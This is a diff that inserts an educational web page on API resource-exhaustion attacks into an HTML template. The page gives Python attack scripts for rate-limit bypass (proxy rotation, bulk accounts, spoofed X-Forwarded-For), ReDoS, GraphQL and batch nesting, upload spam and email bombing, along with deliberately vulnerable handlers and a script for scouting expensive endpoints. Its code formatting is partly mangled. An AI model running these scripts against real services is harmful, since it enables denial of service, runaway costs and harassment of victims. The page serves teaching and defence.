@@ -215,7 +215,799 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>API04: Unrestricted Resource Consumption - Attack Vectors</h1>
+
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding-attack-vectors">Understanding Attack Vectors</a></li>
+<li><a href="#rate-limit-bypass-techniques">Rate Limit Bypass Techniques</a></li>
+<li><a href="#cpu-exhaustion-attacks">CPU Exhaustion Attacks</a></li>
+<li><a href="#memory-exhaustion-attacks">Memory Exhaustion Attacks</a></li>
+<li><a href="#database-overload-attacks">Database Overload Attacks</a></li>
+<li><a href="#batch-operation-abuse">Batch Operation Abuse</a></li>
+<li><a href="#storage-exhaustion-attacks">Storage Exhaustion Attacks</a></li>
+<li><a href="#network-bandwidth-attacks">Network Bandwidth Attacks</a></li>
+<li><a href="#third-party-resource-abuse">Third-Party Resource Abuse</a></li>
+</ul>
+
+<h2>Understanding Attack Vectors</h2>
+
+<p>Resource exhaustion attacks exploit the gap between what the API <strong>allows</strong> and what it can <strong>handle</strong>. Attackers use legitimate API functionality to overwhelm system resources, making the service unavailable or degraded for legitimate users.</p>
+
+<h3>Attack Lifecycle</h3>
+
+<p>``<code></p>
+<ol>
+<li>Reconnaissance</li>
+</ol>
+<p>   └─ Identify expensive endpoints</p>
+<p>      └─ Test rate limits (if any)</p>
+<p>         └─ Map resource consumption patterns</p>
+
+<ol>
+<li>Exploitation</li>
+</ol>
+<p>   └─ Craft attack requests</p>
+<p>      └─ Distribute across IPs/accounts</p>
+<p>         └─ Automate at scale</p>
+
+<ol>
+<li>Impact</li>
+</ol>
+<p>   └─ Resource exhaustion</p>
+<p>      └─ Service degradation</p>
+<p>         └─ Complete unavailability</p>
+</code>`<code>
+
+<h2>Rate Limit Bypass Techniques</h2>
+
+<p>Even when rate limiting exists, attackers use various techniques to bypass it.</p>
+
+<h3>Vector 1: IP Rotation</h3>
+<strong>Method</strong>: Distribute requests across multiple IP addresses.
+
+<strong>Attack Script</strong>:
+</code>`<code>python
+<p>import requests</p>
+<p>import itertools</p>
+
+<h1>Proxy list or cloud VPN endpoints</h1>
+<p>proxies = [</p>
+<p>    {'http': 'http://proxy1.com:8080'},</p>
+<p>    {'http': 'http://proxy2.com:8080'},</p>
+<p>    {'http': 'http://proxy3.com:8080'},</p>
+<p>    # ... hundreds more</p>
+<p>]</p>
+
+<p>proxy_pool = itertools.cycle(proxies)</p>
+
+<p>target_url = 'https://api.target.com/expensive-endpoint'</p>
+
+<p>for i in range(10000):</p>
+<p>    proxy = next(proxy_pool)</p>
+<p>    try:</p>
+<p>        response = requests.get(target_url, proxies=proxy)</p>
+<p>        print(f"Request {i}: Status {response.status_code}")</p>
+<p>    except:</p>
+<p>        pass</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: Rate limits based only on IP address can't distinguish between different users behind proxies or VPNs.
+
+<strong>Impact</strong>: Bypasses IP-based rate limiting completely.
+
+<h3>Vector 2: User Account Flooding</h3>
+<strong>Method</strong>: Create many legitimate user accounts to multiply rate limits.
+
+<strong>Attack Script</strong>:
+</code>`<code>python
+<p>import requests</p>
+<p>import random</p>
+<p>import string</p>
+
+<p>def random_email():</p>
+<p>    return f"{''.join(random.choices(string.ascii_lowercase, k=10))}@temp-mail.com"</p>
+
+<p>api_base = 'https://api.target.com'</p>
+
+<h1>Create 1000 accounts</h1>
+<p>accounts = []</p>
+<p>for i in range(1000):</p>
+<p>    email = random_email()</p>
+<p>    response = requests.post(f'{api_base}/register', json={</p>
+<p>        'email': email,</p>
+<p>        'password': 'Password123!'</p>
+<p>    })</p>
+<p>    if response.status_code == 201:</p>
+<p>        # Login to get token</p>
+<p>        auth = requests.post(f'{api_base}/login', json={</p>
+<p>            'email': email,</p>
+<p>            'password': 'Password123!'</p>
+<p>        })</p>
+<p>        token = auth.json()['token']</p>
+<p>        accounts.append(token)</p>
+
+<h1>Now use all accounts to multiply attack capacity</h1>
+<h1>If limit is 100 req/min per user, 1000 accounts = 100,000 req/min</h1>
+<p>for token in accounts:</p>
+<p>    for i in range(100):</p>
+<p>        requests.get(</p>
+<p>            f'{api_base}/expensive-operation',</p>
+<p>            headers={'Authorization': f'Bearer {token}'}</p>
+<p>        )</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: Rate limits are typically per-user, so more users = more total capacity.
+
+<strong>Impact</strong>: Multiplies attack capacity by number of accounts.
+
+<h3>Vector 3: Header Manipulation</h3>
+<strong>Method</strong>: Exploit inconsistent client identification.
+
+<strong>Vulnerable API Logic</strong>:
+</code>`<code>python
+<h1>API identifies clients by X-Forwarded-For header</h1>
+<p>client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)</p>
+<p>rate_limit_key = f"rate_limit:{client_ip}"</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<p>for i in range(10000):</p>
+<p>    # Fake a different IP each time</p>
+<p>    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"</p>
+    
+<p>    requests.get(</p>
+<p>        'https://api.target.com/endpoint',</p>
+<p>        headers={'X-Forwarded-For': fake_ip}</p>
+<p>    )</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: Trusting client-provided headers for rate limiting.
+
+<strong>Impact</strong>: Unlimited requests by spoofing identity.
+
+<h3>Vector 4: Timing-Based Bypass</h3>
+<strong>Method</strong>: Exploit rate limit window boundaries.
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<p>import time</p>
+
+<h1>If rate limit is 100 requests per minute (fixed window)</h1>
+<h1>Attack at window boundaries</h1>
+
+<p>def attack_at_boundary():</p>
+<p>    # Send 100 requests at 59 seconds</p>
+<p>    for i in range(100):</p>
+<p>        requests.get('https://api.target.com/endpoint')</p>
+    
+<p>    # Wait 2 seconds for window reset</p>
+<p>    time.sleep(2)</p>
+    
+<p>    # Send another 100 requests at 1 second of new window</p>
+<p>    for i in range(100):</p>
+<p>        requests.get('https://api.target.com/endpoint')</p>
+    
+<p>    # Result: 200 requests in 3 seconds instead of 60 seconds</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: Fixed window rate limiting has boundary weaknesses.
+
+<strong>Impact</strong>: 2x rate limit capacity at window boundaries.
+
+<h3>Vector 5: API Key Cycling</h3>
+<strong>Method</strong>: Rotate through multiple API keys.
+
+</code>`<code>python
+<p>api_keys = [</p>
+<p>    'key_1_from_free_trial',</p>
+<p>    'key_2_from_different_email',</p>
+<p>    'key_3_from_temp_account',</p>
+<p>    # ... many more</p>
+<p>]</p>
+
+<p>for key in itertools.cycle(api_keys):</p>
+<p>    requests.get(</p>
+<p>        'https://api.target.com/endpoint',</p>
+<p>        headers={'X-API-Key': key}</p>
+<p>    )</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: Free tier API keys can be created in bulk.
+
+<strong>Impact</strong>: Multiplies rate limits by number of keys.
+
+<h2>CPU Exhaustion Attacks</h2>
+
+<p>Attacks that maximize CPU usage to slow down or crash the service.</p>
+
+<h3>Vector 6: Regex Denial of Service (ReDoS)</h3>
+<strong>Method</strong>: Exploit catastrophic backtracking in regular expressions.
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>import re</p>
+
+<p>@app.route('/api/validate')</p>
+<p>def validate():</p>
+<p>    user_input = request.args.get('input')</p>
+    
+<p>    # VULNERABLE: Catastrophic backtracking</p>
+<p>    pattern = r'^(a+)+$'</p>
+    
+<p>    if re.match(pattern, user_input):</p>
+<p>        return jsonify({'valid': True})</p>
+<p>    return jsonify({'valid': False})</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>This string causes exponential backtracking</h1>
+<h1>Time complexity: O(2^n)</h1>
+<p>malicious_input = 'a' * 30 + 'b'</p>
+
+<p>requests.get(</p>
+<p>    'https://api.target.com/validate',</p>
+<p>    params={'input': malicious_input}</p>
+<p>)</p>
+
+<h1>This single request can take 10+ seconds and max out a CPU core</h1>
+</code>`<code>
+
+<strong>Other Vulnerable Patterns</strong>:
+</code>`<code>regex
+<p>(a+)+</p>
+<p>(a|a)*</p>
+<p>(a|ab)*</p>
+<p>([a-zA-Z]+)*</p>
+<p>(.<em>)</em></p>
+</code>`<code>
+
+<strong>Why It Works</strong>: Regex engine tries exponentially more combinations.
+
+<strong>Impact</strong>: Single request can consume CPU for seconds/minutes.
+
+<h3>Vector 7: Complex Query Exploitation</h3>
+<strong>Method</strong>: Craft queries that require maximum computation.
+
+<strong>Vulnerable GraphQL API</strong>:
+</code>`<code>graphql
+<p>query {</p>
+<p>  users {</p>
+<p>    posts {</p>
+<p>      comments {</p>
+<p>        author {</p>
+<p>          posts {</p>
+<p>            comments {</p>
+<p>              author {</p>
+<p>                # Deep nesting causes N+1 queries</p>
+<p>                # Exponential database hits</p>
+<p>              }</p>
+<p>            }</p>
+<p>          }</p>
+<p>        }</p>
+<p>      }</p>
+<p>    }</p>
+<p>  }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Attack Query</strong>:
+</code>`<code>python
+<p>complex_query = """</p>
+<p>query {</p>
+<p>  users(limit: 1000) {</p>
+<p>    posts(limit: 100) {</p>
+<p>      comments(limit: 100) {</p>
+<p>        replies(limit: 100) {</p>
+<p>          # 1000 <em> 100 </em> 100 * 100 = 100M database queries</p>
+<p>        }</p>
+<p>      }</p>
+<p>    }</p>
+<p>  }</p>
+<p>}</p>
+<p>"""</p>
+
+<p>requests.post(</p>
+<p>    'https://api.target.com/graphql',</p>
+<p>    json={'query': complex_query}</p>
+<p>)</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: No depth limiting or query cost analysis.
+
+<strong>Impact</strong>: Single query can trigger millions of database operations.
+
+<h3>Vector 8: Algorithmic Complexity Attack</h3>
+<strong>Method</strong>: Exploit endpoints with poor algorithmic complexity.
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>@app.route('/api/sort')</p>
+<p>def sort_data():</p>
+<p>    # User provides data to sort</p>
+<p>    data = request.json['data']</p>
+    
+<p>    # VULNERABLE: Using bubble sort O(n²)</p>
+<p>    def bubble_sort(arr):</p>
+<p>        n = len(arr)</p>
+<p>        for i in range(n):</p>
+<p>            for j in range(0, n-i-1):</p>
+<p>                if arr[j] > arr[j+1]:</p>
+<p>                    arr[j], arr[j+1] = arr[j+1], arr[j]</p>
+<p>        return arr</p>
+    
+<p>    sorted_data = bubble_sort(data)</p>
+<p>    return jsonify(sorted_data)</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Send worst-case data</h1>
+<p>attack_payload = list(range(100000, 0, -1))  # Reverse sorted</p>
+
+<p>requests.post(</p>
+<p>    'https://api.target.com/sort',</p>
+<p>    json={'data': attack_payload}</p>
+<p>)</p>
+
+<h1>O(n²) with n=100,000 = 10 billion operations</h1>
+</code>`<code>
+
+<strong>Why It Works</strong>: Inefficient algorithms scale poorly.
+
+<strong>Impact</strong>: CPU exhaustion with single request.
+
+<h3>Vector 9: Cryptographic Workload Amplification</h3>
+<strong>Method</strong>: Abuse expensive cryptographic operations.
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>import bcrypt</p>
+
+<p>@app.route('/api/login', methods=['POST'])</p>
+<p>def login():</p>
+<p>    password = request.json['password']</p>
+    
+<p>    # VULNERABLE: bcrypt with high work factor</p>
+<p>    # Deliberately expensive (good for security, bad without rate limiting)</p>
+<p>    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=14))</p>
+    
+<p>    # ... check against stored hash</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Parallel login attempts</h1>
+<p>import concurrent.futures</p>
+
+<p>def attempt_login():</p>
+<p>    requests.post('https://api.target.com/login', json={</p>
+<p>        'username': 'victim@example.com',</p>
+<p>        'password': 'wrong_password'</p>
+<p>    })</p>
+
+<h1>100 concurrent requests</h1>
+<p>with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:</p>
+<p>    futures = [executor.submit(attempt_login) for _ in range(100)]</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: Each bcrypt operation is intentionally CPU-intensive.
+
+<strong>Impact</strong>: CPU exhaustion even with modest request rate.
+
+<h2>Memory Exhaustion Attacks</h2>
+
+<p>Attacks that fill available RAM to crash the service.</p>
+
+<h3>Vector 10: Large Payload Attack</h3>
+<strong>Method</strong>: Send massive request bodies.
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>@app.route('/api/process', methods=['POST'])</p>
+<p>def process_data():</p>
+<p>    # No size limit on request</p>
+<p>    data = request.get_json()  # Loads entire JSON into memory</p>
+    
+<p>    # Process the data</p>
+<p>    result = expensive_processing(data)</p>
+<p>    return jsonify(result)</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Generate 1GB JSON payload</h1>
+<p>massive_payload = {</p>
+<p>    'data': ['x' * 1000000 for _ in range(1000)]</p>
+<p>}</p>
+
+<p>requests.post(</p>
+<p>    'https://api.target.com/process',</p>
+<p>    json=massive_payload</p>
+<p>)</p>
+
+<h1>Multiple concurrent requests = OOM</h1>
+</code>`<code>
+
+<strong>Why It Works</strong>: No request size validation.
+
+<strong>Impact</strong>: Memory exhaustion, OOM crashes.
+
+<h3>Vector 11: Response Size Explosion</h3>
+<strong>Method</strong>: Request operations that generate massive responses.
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>@app.route('/api/users')</p>
+<p>def get_users():</p>
+<p>    # No pagination</p>
+<p>    users = User.query.all()  # 10 million users</p>
+    
+<p>    # Serialize everything to JSON in memory</p>
+<p>    return jsonify([{</p>
+<p>        'id': u.id,</p>
+<p>        'name': u.name,</p>
+<p>        'email': u.email,</p>
+<p>        'profile': u.profile,  # Large text field</p>
+<p>        'settings': u.settings  # JSON blob</p>
+<p>    } for u in users])</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Single request generates multi-GB response</h1>
+<p>requests.get('https://api.target.com/users')</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: No pagination or response size limits.
+
+<strong>Impact</strong>: Server memory exhaustion serializing response.
+
+<h3>Vector 12: Session/Cache Bloat</h3>
+<strong>Method</strong>: Create massive numbers of sessions or cache entries.
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Create millions of sessions</h1>
+<p>for i in range(1000000):</p>
+<p>    session = requests.Session()</p>
+<p>    session.get('https://api.target.com/')  # Creates server-side session</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: No session cleanup or limits.
+
+<strong>Impact</strong>: Memory filled with session data.
+
+<h2>Database Overload Attacks</h2>
+
+<p>Attacks targeting database resources.</p>
+
+<h3>Vector 13: Query Flood</h3>
+<strong>Method</strong>: Overwhelming database with concurrent queries.
+
+<strong>Attack</strong>:
+</code>`<code>python
+<p>import concurrent.futures</p>
+
+<p>def query_database():</p>
+<p>    requests.get('https://api.target.com/search?q=expensive_query')</p>
+
+<h1>1000 concurrent database queries</h1>
+<p>with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:</p>
+<p>    futures = [executor.submit(query_database) for _ in range(1000)]</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: No connection pool limits or query queueing.
+
+<strong>Impact</strong>: Database connection pool exhaustion.
+
+<h3>Vector 14: Expensive Join Attack</h3>
+<strong>Method</strong>: Craft queries that require expensive database operations.
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>@app.route('/api/reports')</p>
+<p>def generate_report():</p>
+<p>    # User controls filter parameters</p>
+<p>    filters = request.args.to_dict()</p>
+    
+<p>    # Dynamic query building (VULNERABLE)</p>
+<p>    query = db.session.query(Orders)\</p>
+<p>        .join(Users)\</p>
+<p>        .join(Products)\</p>
+<p>        .join(Categories)\</p>
+<p>        .join(Suppliers)</p>
+    
+<p>    for key, value in filters.items():</p>
+<p>        query = query.filter(getattr(Orders, key) == value)</p>
+    
+<p>    results = query.all()</p>
+<p>    return jsonify([r.to_dict() for r in results])</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Request with filters that prevent index usage</h1>
+<p>requests.get('https://api.target.com/reports', params={</p>
+<p>    'created_at__gt': '2020-01-01',  # Full table scan</p>
+<p>    'amount__lt': '1000000',  # Another full scan</p>
+<p>    # Multiple filters forcing massive JOIN</p>
+<p>})</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: No query optimization, cost limits, or timeouts.
+
+<strong>Impact</strong>: Database CPU and I/O exhaustion.
+
+<h3>Vector 15: Write Amplification</h3>
+<strong>Method</strong>: Trigger operations that write excessive data.
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>@app.route('/api/log/event', methods=['POST'])</p>
+<p>def log_event():</p>
+<p>    event = request.json</p>
+    
+<p>    # VULNERABLE: No limit on log entries</p>
+<p>    Log.create(</p>
+<p>        user_id=event['user_id'],</p>
+<p>        event_type=event['type'],</p>
+<p>        data=event['data']</p>
+<p>    )</p>
+    
+<p>    return jsonify({'status': 'logged'})</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Flood log table with millions of entries</h1>
+<p>for i in range(1000000):</p>
+<p>    requests.post('https://api.target.com/log/event', json={</p>
+<p>        'user_id': 123,</p>
+<p>        'type': 'spam',</p>
+<p>        'data': 'x' * 1000</p>
+<p>    })</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: No write rate limiting.
+
+<strong>Impact</strong>: Database storage exhaustion, I/O degradation.
+
+<h2>Batch Operation Abuse</h2>
+
+<p>Exploiting endpoints that process multiple items.</p>
+
+<h3>Vector 16: Unbounded Batch Size</h3>
+<strong>Method</strong>: Send batch requests with excessive items.
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>@app.route('/api/batch/process', methods=['POST'])</p>
+<p>def batch_process():</p>
+<p>    items = request.json['items']  # No size limit</p>
+    
+<p>    results = []</p>
+<p>    for item in items:</p>
+<p>        result = expensive_operation(item)</p>
+<p>        results.append(result)</p>
+    
+<p>    return jsonify(results)</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Send batch with 1 million items</h1>
+<p>attack_payload = {</p>
+<p>    'items': [{'data': 'payload'} for _ in range(1000000)]</p>
+<p>}</p>
+
+<p>requests.post('https://api.target.com/batch/process', json=attack_payload)</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: No batch size validation.
+
+<strong>Impact</strong>: CPU and memory exhaustion processing massive batch.
+
+<h3>Vector 17: Batch Request Nesting</h3>
+<strong>Method</strong>: Nest batch operations for multiplication effect.
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Each batch item is itself a batch request</h1>
+<p>nested_payload = {</p>
+<p>    'items': [</p>
+<p>        {</p>
+<p>            'type': 'batch',</p>
+<p>            'items': [{'data': 'x'} for _ in range(1000)]</p>
+<p>        }</p>
+<p>        for _ in range(1000)</p>
+<p>    ]</p>
+<p>}</p>
+
+<h1>1000 * 1000 = 1 million operations from one request</h1>
+<p>requests.post('https://api.target.com/batch/process', json=nested_payload)</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: No nesting depth validation.
+
+<strong>Impact</strong>: Exponential resource consumption.
+
+<h2>Storage Exhaustion Attacks</h2>
+
+<p>Filling available disk space.</p>
+
+<h3>Vector 18: File Upload Spam</h3>
+<strong>Method</strong>: Upload massive or numerous files.
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>@app.route('/api/upload', methods=['POST'])</p>
+<p>def upload():</p>
+<p>    file = request.files['file']</p>
+<p>    # No size or type validation</p>
+<p>    file.save(f'uploads/{file.filename}')</p>
+<p>    return jsonify({'status': 'uploaded'})</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Upload 10GB files repeatedly</h1>
+<p>large_file = io.BytesIO(b'0' <em> (10 </em> 1024 <em> 1024 </em> 1024))</p>
+
+<p>for i in range(100):</p>
+<p>    files = {'file': (f'spam_{i}.bin', large_file)}</p>
+<p>    requests.post('https://api.target.com/upload', files=files)</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: No upload size limits or quota enforcement.
+
+<strong>Impact</strong>: Disk space exhaustion.
+
+<h3>Vector 19: Log Explosion</h3>
+<strong>Method</strong>: Trigger excessive logging.
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Trigger errors that generate verbose logs</h1>
+<p>for i in range(100000):</p>
+<p>    requests.post('https://api.target.com/endpoint', json={</p>
+<p>        'data': 'x' * 100000  # Each error logs 100KB</p>
+<p>    })</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: Verbose error logging without rotation.
+
+<strong>Impact</strong>: Log files fill disk.
+
+<h2>Third-Party Resource Abuse</h2>
+
+<p>Exploiting external service usage.</p>
+
+<h3>Vector 20: Email/SMS Bombing</h3>
+<strong>Method</strong>: Trigger mass sending of emails or SMS.
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>@app.route('/api/send-verification')</p>
+<p>def send_verification():</p>
+<p>    email = request.args.get('email')</p>
+    
+<p>    # No rate limit on sends</p>
+<p>    send_verification_email(email)</p>
+    
+<p>    return jsonify({'status': 'sent'})</p>
+</code>`<code>
+
+<strong>Attack</strong>:
+</code>`<code>python
+<h1>Trigger 10,000 emails</h1>
+<p>for i in range(10000):</p>
+<p>    requests.get('https://api.target.com/send-verification', params={</p>
+<p>        'email': 'victim@example.com'</p>
+<p>    })</p>
+</code>`<code>
+
+<strong>Why It Works</strong>: No send rate limiting.
+
+<strong>Impact</strong>: 
+<ul>
+<li>Email/SMS service costs</li>
+<li>Service quota exhaustion</li>
+<li>Harassment of victim</li>
+</ul>
+
+<h2>Detection and Reconnaissance</h2>
+
+<p>Before launching attacks, attackers identify vulnerable endpoints.</p>
+
+<h3>Reconnaissance Steps</h3>
+
+</code>`<code>python
+<p>import requests</p>
+<p>import time</p>
+
+<p>def find_expensive_endpoints(base_url):</p>
+<p>    endpoints = [</p>
+<p>        '/api/search',</p>
+<p>        '/api/users',</p>
+<p>        '/api/reports',</p>
+<p>        '/api/export',</p>
+<p>        '/api/batch',</p>
+<p>    ]</p>
+    
+<p>    results = []</p>
+<p>    for endpoint in endpoints:</p>
+<p>        start = time.time()</p>
+        
+<p>        try:</p>
+<p>            response = requests.get(f'{base_url}{endpoint}')</p>
+<p>            duration = time.time() - start</p>
+            
+<p>            results.append({</p>
+<p>                'endpoint': endpoint,</p>
+<p>                'duration': duration,</p>
+<p>                'size': len(response.content),</p>
+<p>                'status': response.status_code</p>
+<p>            })</p>
+<p>        except:</p>
+<p>            pass</p>
+    
+<p>    # Sort by response time (expensive endpoints)</p>
+<p>    results.sort(key=lambda x: x['duration'], reverse=True)</p>
+    
+<p>    return results</p>
+
+<h1>Find slowest endpoints to target</h1>
+<p>expensive = find_expensive_endpoints('https://api.target.com')</p>
+<p>print("Top targets:", expensive[:3])</p>
+</code>`<code>
+
+<h2>Combined Attack Scenarios</h2>
+
+<p>Real-world attacks often combine multiple vectors.</p>
+
+<h3>Scenario 1: Multi-Vector DoS</h3>
+</code>`<code>python
+<h1>1. Create multiple accounts (bypass per-user limits)</h1>
+<h1>2. Use IP rotation (bypass IP limits)</h1>
+<h1>3. Target expensive endpoints (maximize impact)</h1>
+<h1>4. Send complex queries (CPU exhaustion)</h1>
+<h1>5. Request large responses (memory exhaustion)</h1>
+
+<h1>Result: Complete service unavailability</h1>
+</code>`<code>
+
+<h3>Scenario 2: Cost Amplification</h3>
+</code>`<code>python
+<h1>1. Identify third-party service usage (emails, SMS, cloud APIs)</h1>
+<h1>2. Trigger maximum external service calls</h1>
+<h1>3. Generate unexpected bills for target</h1>
+<h1>4. Potentially exhaust service quotas</h1>
+
+<h1>Result: Financial damage + service disruption</h1>
+</code>``
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>Legitimate requests can be weapons</strong> - No "malicious payload" needed</li>
+<li><strong>Rate limiting is necessary but insufficient</strong> - Must be combined with resource limits</li>
+<li><strong>Every endpoint is a potential attack vector</strong> - Comprehensive protection required</li>
+<li><strong>Attackers use economics</strong> - Maximize damage while minimizing cost</li>
+<li><strong>Bypass techniques are well-known</strong> - Simple rate limiting is easily defeated</li>
+<li><strong>Complexity is exploitable</strong> - Simple is more secure</li>
+</ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong>Learn Prevention</strong> → <a href="./prevention.md">prevention.md</a> - Implement robust defenses</li>
+<li><strong>Study Examples</strong> → <a href="./examples.md">examples.md</a> - See working implementations</li>
+<li><strong>Practice</strong> → <a href="./lab/api04-rate-limiting-lab/">lab/</a> - Exploit and fix vulnerabilities</li>
+</ul>
+
         </div>
     </div>
 </body>
